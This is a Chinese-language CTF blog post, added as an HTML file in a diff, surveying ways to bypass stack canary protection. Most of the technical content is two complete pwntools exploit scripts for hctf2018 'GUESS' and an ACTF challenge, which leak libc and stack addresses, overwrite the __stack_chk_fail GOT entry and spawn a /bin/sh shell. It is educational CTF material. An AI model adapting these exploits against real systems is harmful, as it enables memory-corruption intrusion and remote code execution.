@@ -1,0 +1,268 @@
+<!DOCTYPE HTML>
+<html class="no-js" lang="zh-CN">
+<!--
+//                            _ooOoo_
+//                           o8888888o
+//                           88" . "88
+//                           (| -_- |)
+//                            O\ = /O
+//                        ____/`---'\____
+//                      .   ' \\| |// `.
+//                       / \\||| : |||// \
+//                     / _||||| -:- |||||- \
+//                       | | \\\ - /// | |
+//                     | \_| ''\---/'' | |
+//                      \ .-\__ `-` ___/-. /
+//                   ___`. .' /--.--\ `. . __
+//                ."" '< `.___\_<|>_/___.' >'"".
+//               | | : `- \`.;`\ _ /`;.`/ - ` : | |
+//                 \ \ `-. \_ __\ /__ _/ .-` / /
+//         ======`-.____`-.___\_____/___.-`____.-'======
+//                            `=---='
+//                 拦截插件累计拦截逗比攻击"1381438"次！
+//         .............................................
+//                  佛祖保佑             永无BUG
+//          佛曰:
+//                  写字楼里写字间，写字间里程序员；
+//                  程序人员写程序，又拿程序换酒钱。
+//                  酒醒只在网上坐，酒醉还来网下眠；
+//                  酒醉酒醒日复日，网上网下年复年。
+//                  但愿老死电脑间，不愿鞠躬老板前；
+//                  奔驰宝马贵者趣，公交自行程序员。
+//                  别人笑我忒疯癫，我笑自己命太贱；
+//                  不见满街漂亮妹，哪个归得程序员？
+-->
+<head><meta name="generator" content="Hexo 3.8.0">
+    <!--[if lte IE 9]>
+<meta http-equiv="refresh" content="0;url=http://yoursite.com/warn.html">
+<![endif]-->
+<meta charset="utf-8">
+
+<meta http-equiv="Content-Security-Policy" content="upgrade-insecure-requests">
+
+<meta http-equiv="X-UA-Compatible" content="IE=Edge">
+<meta name="renderer" content="webkit">
+<meta name="viewport" content="width=device-width, initial-scale=1.0,user-scalable=no">
+<meta http-equiv="mobile-agent" content="format=html5; url=http://yoursite.com">
+<meta name="author" content="treebacker">
+<link rel="stylesheet" href="../../../../css/SimpleStyle.min.css">
+
+<link rel="shortcut icon" href="../../../../images/favicon.png">
+
+
+<title>canary绕过总览 - Watch Security</title>
+
+<meta name="keywords" content="pwn canary">
+
+<meta name="description " content="some ways to bypass canary">
+
+</head>
+<body>
+<div id="nav">
+    <nav class="nav-menu">
+        <a class="site-name current" href="/" title="Tree">Tree</a>
+        <a class="site-index current" href="/"><i class="fa fa-home"></i><span>首页</span></a>
+        <a href="/archives" title="归档"><i class="fa fa-archives"></i><span>归档</span></a>
+        <a href="/tags" title="标签"><i class="fa fa-tags"></i><span>标签</span></a>
+        <!-- custom single page of menus -->
+        
+        
+        <a href="/help" title="帮助">
+            <i class="fa fa-question-circle"></i>
+            <span>帮助</span>
+        </a>
+        
+    </nav>
+</div>
+
+<div class="nav-user">
+    <a class="btn-search" href="#"><i class="fa fa-search"></i></a>
+    <a class="btn-read-mode" href="#"><i class="fa fa-sun-o"></i></a>
+    <a class="btn-sns-qr" href="javascript:"><i class="fa fa-telegram"></i></a>
+</div>
+
+<div id="wrapper" class="clearfix">
+    <div id="body">
+        <div class="main" id="main">
+            <div id="cover">
+    <div class="cover-img"></div>
+    <div class="cover-info">
+        
+        <h1 class="cover-siteName">Treebacker</h1>
+        <h3 class="cover-siteTitle">愿麦子和麦子长在一起，愿河流与河流流归一处。</h3>
+        <p class="cover-siteDesc">Tech and Eesay</p>
+        <div class="cover-sns">
+            
+            <div class="btn btn-github">
+                <a href="https://github.com/treebacker" target="_blank" title="github" ref="friend">
+                    <i class="fa fa-github"></i>
+                </a>
+            </div>
+            
+        </div>
+    </div>
+</div>
+            <div class="page-title">
+    <ul>
+        <li><a href="/">最新</a></li>
+        
+            
+                <li class="active">
+                    <a href="/categories/tech-notes" data-name="技术">技术</a>
+                </li>
+            
+                <li class="">
+                    <a href="/categories/essays" data-name="随笔">随笔</a>
+                </li>
+            
+                <li class="">
+                    <a href="/categories/cdcitizen-of-the-sun" data-name="海子">海子</a>
+                </li>
+            
+                <li class="">
+                    <a href="/categories/others" data-name="其他">其他</a>
+                </li>
+            
+        
+        <li class="page-search">
+    <form id="search" class="search-form">
+        <label for="s" class="sr-only">请输入关键字</label>
+        <input class="search-field" type="text" name="s" placeholder="请输入关键字">
+        <button type="submit" class="search-form-submit" title="搜索"><i class="fa fa-search"></i></button>
+    </form>
+    <div class="ins-search">
+    <div class="ins-search-mask"></div>
+    <div class="ins-search-container">
+        <div class="ins-input-wrapper">
+            <input type="text" class="ins-search-input" placeholder="请输入关键词...">
+            <span class="ins-close ins-selectable"><i class="fa fa-times-circle"></i></span>
+        </div>
+        <div class="ins-section-wrapper">
+            <div class="ins-section-container"></div>
+        </div>
+    </div>
+</div>
+<script>
+(function (window) {
+    var INSIGHT_CONFIG = {
+        TRANSLATION: {
+            POSTS: '文章',
+            PAGES: '页面',
+            CATEGORIES: '分类',
+            TAGS: '标签',
+            UNTITLED: '(无标题)',
+        },
+        ROOT_URL: '/',
+        CONTENT_URL: '../../../../content.json',
+    };
+    window.INSIGHT_CONFIG = INSIGHT_CONFIG;
+})(window);
+</script>
+</li>
+
+    </ul>
+</div>
+<div class="main-inner">
+    <article class="post" itemscope="" itemtype="http://schema.org/BlogPosting">
+        <div class="post-header">
+            <div class="post-author clearfix">
+                <a class="avatar fleft" href="" target="_blank">
+                    <img width="48" src="/images/favicon.png" alt="avatar">
+                </a>
+                <p><span class="label">作者</span>
+                    <a href="" target="_blank">Treebacker</a>
+                    <span title="最后编辑于2019-06-30">2019-06-30</span>
+                </p>
+                <p></p>
+            </div>
+            <h2 class="post-title">Canary绕过总览</h2>
+            <div class="post-meta">
+                本文总共4495个字 | 您是第<span id="busuanzi_value_page_pv"><i class="fa fa-spinner fa-spin"></i></span>位看到它们的小伙伴
+            </div>
+        </div>
+        <div class="post-content markdown-body">
+            <h3 id="“金丝雀”-Canary-保护"><a href="#“金丝雀”-Canary-保护" class="headerlink" title="“金丝雀”(Canary)保护"></a>“金丝雀”(Canary)保护</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">是一种在栈上（缓冲区与返回地址之间的某一位置）布置一个特殊的字段（以&apos;\x00&apos;结尾），通过检查该字段有无被修改来判断是否溢出。一旦溢出就会终止程序运行。可以有效的防止栈溢出攻击</span><br><span class="line">但是嘛，总也会被smart hackers找到绕过的方式。本文就几种有效的方式简要记录。共勉</span><br></pre></td></tr></table></figure>
+<h4 id="爆破"><a href="#爆破" class="headerlink" title="爆破"></a>爆破</h4><p>​    某种前提下，爆破无疑是最省脑子的方式了。</p>
+<p>​    一般程序如果有fork子进程，就可以用这种方式（子进程的终止不会影响父进程）。需要注意的是，这种方式需要在脚本中进行异常处理(try    catch)。</p>
+<h4 id="泄露Canary值"><a href="#泄露Canary值" class="headerlink" title="泄露Canary值"></a>泄露Canary值</h4><p>​    在知道Canary值在栈上的位置的情况下，可以泄露Canary（填充到该位置，输出连带出来）。该值以’\x00’结尾。</p>
+<p>​    得到该值后，每次传入payload时，只需要正确的用该值覆盖即可绕过检测。</p>
+<p>​    但是该方法利用有限，当输入方式或者输出方式以’\x00’截断时，就无法传入Canary值后的一部分payload，利用失败。</p>
+<h5 id="以上两种方式，都是在避免触发Canary检测到错误。"><a href="#以上两种方式，都是在避免触发Canary检测到错误。" class="headerlink" title="以上两种方式，都是在避免触发Canary检测到错误。"></a>以上两种方式，都是在避免触发Canary检测到错误。</h5><h5 id="另一种思路是，主动触发Canary检测错误。（见以下两种方式）"><a href="#另一种思路是，主动触发Canary检测错误。（见以下两种方式）" class="headerlink" title="另一种思路是，主动触发Canary检测错误。（见以下两种方式）"></a>另一种思路是，主动触发Canary检测错误。（见以下两种方式）</h5><p>​    这种思路的原理基于Canary处理错误的机制。最终会执行__stack_chk_fail函数。该函数的源码如下</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> __attribute__ ((noreturn)) __stack_chk_fail (<span class="keyword">void</span>)</span><br><span class="line">&#123;</span><br><span class="line">  __fortify_fail (<span class="string">"stack smashing detected"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">void</span> __attribute__ ((noreturn)) internal_function __fortify_fail (<span class="keyword">const</span> <span class="keyword">char</span> *msg)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">/* The loop is added only to keep gcc happy.  */</span></span><br><span class="line">  <span class="keyword">while</span> (<span class="number">1</span>)</span><br><span class="line">    __libc_message (<span class="number">2</span>, <span class="string">"*** %s ***: %s terminated\n"</span>,</span><br><span class="line">                    msg, __libc_argv[<span class="number">0</span>] ?: <span class="string">"&lt;unknown&gt;"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>可以看到，该函数输出程序出错的信息，两个”%s”格式化参数，第一个已经固定”stack smashing detected”。第二个确是可变参数，__libc_argv[0]，其实一般就是程序名。而且这个参数就是存在于栈上。</p>
+<h4 id="泄露地址变量"><a href="#泄露地址变量" class="headerlink" title="泄露地址变量"></a>泄露地址变量</h4><ul>
+<li><h5 id="全局地址"><a href="#全局地址" class="headerlink" title="全局地址"></a>全局地址</h5><ul>
+<li>简单地将__libc_argv[0]参数修改为全局变量的地址。如果程序将flag文件读进了某一全局地址，直接泄露flag</li>
+</ul>
+</li>
+<li><h5 id="栈地址"><a href="#栈地址" class="headerlink" title="栈地址"></a>栈地址</h5><ul>
+<li><p>当我们的地址并不是全局地址时，而是在在栈上时，我们就可以通过泄露栈的基地址（一般在_environ参数地址的第一项），再根据参数在栈内的偏移，即可获得参数的绝对地址，即可泄露。</p>
+<h5 id="例子-hctf2018的GUESS题目"><a href="#例子-hctf2018的GUESS题目" class="headerlink" title="例子    hctf2018的GUESS题目"></a>例子    hctf2018的GUESS题目</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.binary = ELF(<span class="string">'./GUESS'</span>)</span><br><span class="line">elf = context.binary</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">puts_got = elf.got[<span class="string">'puts'</span>]</span><br><span class="line"><span class="keyword">print</span> <span class="string">"puts_got ==&gt; "</span> + hex(puts_got)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> args[<span class="string">'REMOTE'</span>]:</span><br><span class="line">	p = remote(<span class="string">'106.75.90.160'</span>,<span class="number">9999</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">	p = process(<span class="string">'./GUESS'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(p, 'b* 0x400ba2')</span></span><br><span class="line"><span class="comment">#leak th address of puts</span></span><br><span class="line">payload = <span class="string">'a'</span> * (<span class="number">0xdd88</span> - <span class="number">0xdc60</span>) + p64(puts_got)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recvuntil(<span class="string">'stack smashing detected ***: '</span>)</span><br><span class="line">puts_addr = u64(p.recvuntil(<span class="string">' '</span>)[:<span class="number">-1</span>].ljust(<span class="number">8</span>, <span class="string">'\x00'</span>))</span><br><span class="line"><span class="keyword">print</span> <span class="string">"puts_addr ==&gt; "</span> + hex(puts_addr)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#get the address of libc</span></span><br><span class="line"><span class="comment">#		from libc-search </span></span><br><span class="line"><span class="comment">#		get the puts_offset</span></span><br><span class="line"><span class="comment">#		get _environ_offset</span></span><br><span class="line"></span><br><span class="line">libc_base = puts_addr - <span class="number">0x06f690</span></span><br><span class="line">_environ = libc_base + <span class="number">0x3c6f38</span></span><br><span class="line">system = libc_base + 	<span class="number">0x045390</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="string">"libc_base ==&gt; "</span> + hex(libc_base)</span><br><span class="line"><span class="keyword">print</span> <span class="string">"_environ ==&gt; "</span> + hex(_environ)</span><br><span class="line"><span class="keyword">print</span> <span class="string">"system ==&gt; "</span> + hex(system)</span><br><span class="line"></span><br><span class="line"><span class="comment">#leak the stack frame address</span></span><br><span class="line"><span class="comment"># the address store the stack_addr</span></span><br><span class="line">payload = <span class="string">'a'</span> * (<span class="number">0xdd88</span> - <span class="number">0xdc60</span>) + p64(_environ)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recvuntil(<span class="string">'stack smashing detected ***: '</span>)</span><br><span class="line">stack_addr = u64(p.recvuntil(<span class="string">' '</span>)[:<span class="number">-1</span>].ljust(<span class="number">8</span>, <span class="string">'\x00'</span>))</span><br><span class="line"><span class="keyword">print</span> <span class="string">"stack_addr ==&gt; "</span> + hex(stack_addr)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#leak the flag</span></span><br><span class="line">payload = <span class="string">'a'</span> * (<span class="number">0xdd88</span> - <span class="number">0xdc60</span>) + p64(stack_addr - <span class="number">0x168</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recvuntil(<span class="string">'stack smashing detected ***: '</span>)</span><br><span class="line">flag = p.recvuntil(<span class="string">' '</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="string">"flag ==&gt; "</span> + flag</span><br><span class="line"></span><br><span class="line">p.close()</span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+</li>
+</ul>
+<h4 id="覆盖Canary触发处理函数"><a href="#覆盖Canary触发处理函数" class="headerlink" title="覆盖Canary触发处理函数"></a>覆盖Canary触发处理函数</h4><p>​    除了泄露变量外，更好的方式就是像覆盖其他的函数got表项一样，覆盖__stack_chk_fail函数的got表项。一般可以考虑用”ret”的地址覆盖，即可达到“即使触发错误，也不会有任何处理操作”。</p>
+<p>​    余下的就和只开了NX的一样利用（ROP）</p>
+<p>​    例子，ACTF复赛的article</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context.binary = <span class="string">'./article'</span></span><br><span class="line">elf = context.binary</span><br><span class="line">libc = elf.libc</span><br><span class="line">context.timeout = <span class="number">10000</span></span><br><span class="line"></span><br><span class="line">puts_got = elf.got[<span class="string">'puts'</span>]</span><br><span class="line">puts_plt = elf.plt[<span class="string">'puts'</span>]</span><br><span class="line">memset_got = elf.got[<span class="string">'memset'</span>]</span><br><span class="line"><span class="keyword">print</span> <span class="string">"puts_got ==&gt; "</span> + hex(puts_got)</span><br><span class="line"><span class="keyword">print</span> <span class="string">"puts_plt ==&gt; "</span> + hex(puts_plt)</span><br><span class="line"><span class="keyword">print</span> <span class="string">"memset_got ==&gt; "</span> + hex(memset_got)</span><br><span class="line"></span><br><span class="line">vul_addr = <span class="number">0x080488B0</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> args[<span class="string">'REMOTE'</span>]:</span><br><span class="line">	p = remote(<span class="string">'202.197.58.168'</span>, <span class="number">33471</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">	p = process(<span class="string">'./article'</span>)</span><br><span class="line">	<span class="comment">#gdb.attach(p, 'b* 0x080488B0')</span></span><br><span class="line">	context.log_level = <span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dbg</span><span class="params">()</span>:</span></span><br><span class="line">	raw_input()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">send</span><span class="params">(payload)</span>:</span></span><br><span class="line">	p.recvuntil(<span class="string">'(less than 10)\n'</span>)</span><br><span class="line">	p.sendline(<span class="string">'1'</span>)</span><br><span class="line">	p.recvuntil(<span class="string">'chars\n'</span>)</span><br><span class="line">	p.send(payload)</span><br><span class="line"></span><br><span class="line">__stack_chk_fial_got = elf.got[<span class="string">'__stack_chk_fail'</span>]</span><br><span class="line">main = <span class="number">0x080488F0</span></span><br><span class="line">ret = <span class="number">0x0804848e</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#stack memory like this</span></span><br><span class="line"><span class="comment">##	s[len = 0x10]</span></span><br><span class="line"><span class="comment">##	v17[len = 0x4]</span></span><br><span class="line"><span class="comment">##	i[len = 0x04]    </span></span><br><span class="line"><span class="comment">##	v19[len = 0x04]  </span></span><br><span class="line"><span class="comment">##	v20[len = 0x04]	  -0xc</span></span><br><span class="line"><span class="comment">##	fake_data[len = 0x08]</span></span><br><span class="line"><span class="comment">## ebp [len = 0x04]   </span></span><br><span class="line"><span class="comment">## ret_address		</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#cover the got of __stack_chk_fial to ret</span></span><br><span class="line"><span class="comment">#then over will make nothing </span></span><br><span class="line"></span><br><span class="line"><span class="comment">#	next all formal rop_use</span></span><br><span class="line"><span class="comment"># leak puts_addr to leak libc</span></span><br><span class="line">payload = p32(ret) + <span class="string">'\x00'</span> * <span class="number">0xc</span> + p32(<span class="number">1</span>) + p32(<span class="number">0</span>) + p32(__stack_chk_fial_got) + <span class="string">'a'</span> * <span class="number">0x10</span> + p32(puts_plt) + p32(main) + p32(puts_got)</span><br><span class="line">send(payload)</span><br><span class="line"></span><br><span class="line">puts_addr = u32(p.recv(<span class="number">4</span>))</span><br><span class="line">libc.address = puts_addr - libc.sym[<span class="string">'puts'</span>]</span><br><span class="line">system_addr = libc.sym[<span class="string">'system'</span>]</span><br><span class="line">binsh = next(libc.search(<span class="string">"/bin/sh"</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="string">"puts_addr ==&gt; "</span>+hex(puts_addr)</span><br><span class="line"><span class="keyword">print</span> <span class="string">"system_addr ==&gt; "</span> + hex(system_addr)</span><br><span class="line"></span><br><span class="line"><span class="comment">#get shell</span></span><br><span class="line">payload = p32(ret) + <span class="string">'\x00'</span> * <span class="number">0xc</span> + p32(<span class="number">1</span>) + p32(<span class="number">0</span>) + p32(__stack_chk_fial_got) + <span class="string">'a'</span> * <span class="number">0x10</span> +  p32(system_addr) + p32(<span class="number">0xdeadbeef</span>) + p32(binsh)</span><br><span class="line">send(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+        </div>
+        <div class="post-tool">
+            <a class="btn-thumbs-up" href="javascript:void(0);" data-cid="52" title="95">
+                <i class="fa fa-thumbs-up" aria-hidden="true"></i> 打赏
+            </a>
+        </div>
+        
+        <div class="post-tags">标签：
+            
+        </div>
+        
+    </article>
+    
+    <p>本文代表个人观点，内容仅供参考。若有不恰当之处，望不吝赐教！</p>
+    
+    
+</div>
+<script src="../../../../js/busuanzi.pure.mini.js"></script>
+
+        </div><!-- end #main-->
+    </div><!-- end #body -->
+    <footer class="footer">
+    <div class="footer-inner">
+        <p>
+            <a href="/about" title="关于本站">关于本站</a>&nbsp;&nbsp<em>·</em>&nbsp;&nbsp
+            <!-- 自定义链接 -->
+            <a href="/help" title="help">急救中心</a>&nbsp;&nbsp<em>·</em>&nbsp;&nbsp
+            <a href="/app" title="App下载">App下载</a>
+        </p>
+        <p>
+            本站点采用<a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">知识共享署名-非商业性使用-相同方式共享 4.0 国际许可协议</a>，已建立<a href="/timeline" id="siteBuildingTime"></a>天<br>
+            ©2017 基于<a href="http://hexo.io" target="_blank">Hexo</a>搭建
+            ，主题&nbsp<a href="https://github.com/tangkunyin/hexo-theme-jsimple" target="_blank">JSimple</a>
+            ，作者<a href="https://www.tangkunyin.com" target="_blank">唐先森</a>
+            ，Hosted by <a href="https://pages.coding.me" style="font-weight: bold">Coding Pages</a>
+        </p>
+        
+
+    </div>
+</footer>
+<script src="../../../../js/InsightSearch.js"></script>
+<script src="../../../../js/SimpleCore.js"></script>
+
+</div>
+<div class="fixed-btn">
+    <a class="btn-gotop" href="javascript:"> <i class="fa fa-angle-up"></i></a>
+</div>
+<script>
+    $(function () {
+        SimpleCore.init({
+            buildingTime: '11/22/2018',
+            current: $('.post-tags').length > 0 ? 'post' : 'archive',
+            snsQRCode: '/images/sns-qrcode.png',
+            donateImg: '/images/donate-qr.png',
+        });
+    });
+</script>
+</body>
+</html>
